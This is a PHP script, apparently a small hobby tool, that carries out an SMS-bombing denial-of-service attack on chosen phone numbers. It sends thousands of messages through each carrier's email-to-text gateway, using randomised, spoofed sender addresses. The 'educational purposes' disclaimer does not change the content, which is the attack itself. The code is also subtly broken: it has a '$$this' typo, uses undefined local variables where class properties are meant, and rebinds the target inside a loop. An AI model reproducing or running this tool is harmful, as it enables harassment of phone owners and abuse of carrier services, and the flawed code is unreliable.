<?php

	/**
	 * Demonstrates a simple DOS attack on a target phone number(s).
	 * This program is designed solely for educational purposes and to be
	 * only use in a controlled environment on devices you are authorized
	 * to and with an understanding of the potential risks this attack
	 * may have on the device, device owner, and server service running this
	 * script.
	 * 
	 * I am not responsible for the illegal and/or unethical use of this
	 * knowledge by other individuals, and I strongly advise against such
	 * behavior.
	 * 
	 * @author NoodleOfDeath
	 * 
	 */
	class PhoneNumberBurner {

		/** Target phone number(s) to burn. */
		private $targets = ["8005551234", ];
		
		/** Messages to randomly send the targets. */
		private $messages = [
			"Hello World A",
			"Hello World B",
			"Hello World C",
		];
		
		/** Strings used to generate random return addresses. */
		private $random_strings = [
			"oobleck",
			"banana",
			"china",
			"silly",
		];

		/** List of popular phone carriers with email-text APIs. */
		private $carriers = [
			"message.alltel.com", // Alltel
			"txt.att.net", // AT&T
			"myboostmobile.com", // Boost Mobile
			"mms.cricketwireless.net", // Cricket Wireless
			"msg.fi.google.com", // Project Fi
			"messaging.sprintpcs.com", // Sprint
			"tmomail.net", // T-Mobile
			"email.uscc.net", // U.S. Cellular
			"vtext.com", // Verizon
			"vmobl.com", // Virgin Mobile
			"text.republicwireless.com", // Republic Wireless
		];

		/**
		 * Constructs a new PhoneNumberBurner instance with an initial set of targets.
		 * @param $targets [string] List of targets to attack.
		 * @param $messages [string] List of messages to randomly send to targets.
		 * @param $random_strings [string] List of strings to use to generate random return addresses.
		 */
		public function __construct($targets = [], $messages = [], $random_strings = []) {
			if (count($targets) > 0) $this -> targets = $targets;
			if (count($messages) > 0) $this -> messages = $messages;
			if (count($random_strings) > 0) $$this -> random_strings = $random_strings;
		}

		/**
		 * Engages in a brute force DOS attack on the specified targets sending
		 * `$n` messages to _each_ target.
		 * 
		 * @param $n int Number of times to send an attack to each target. Default
		 * is 3000. Passing -1 will leave the server in an infinite loop state so you will
		 * have to manually terminate the browser page.
		 */
		public function attack($n = 3000) {

			// Sends the message to each target.
			for ($i = 0; $i < $n; ++$i) {
				foreach ($targets as $target) {
		
					// Generates a random subject and message to be sent.
					$message = $messages[rand(0, count($messages) - 1)];
					
					// Generates a random return address.
					$return_address = sprintf("%s%ld@%s%ld.com", 
							$random_strings[rand(0, count($random_strings) - 1)], 
							rand(999999, 9999999), 
							$random_strings[rand(0, count($random_strings) - 1)], 
							rand(999999, 9999999));
					
					// Adjusts message header to modify the return address.
					$headers = sprintf("'From: %s\r\nReply-To: %s", $return_address, $return_address);
					
					// Sends a message to each carrier to be thorough.
					foreach ($carriers as $carrier) {
						$target = sprintf("%s@%s", $target, $carrier);
						mail($target, "", $message, $headers); // Arg 2 no subject.
					}
					
				}
				
			}

		}


	}

?>
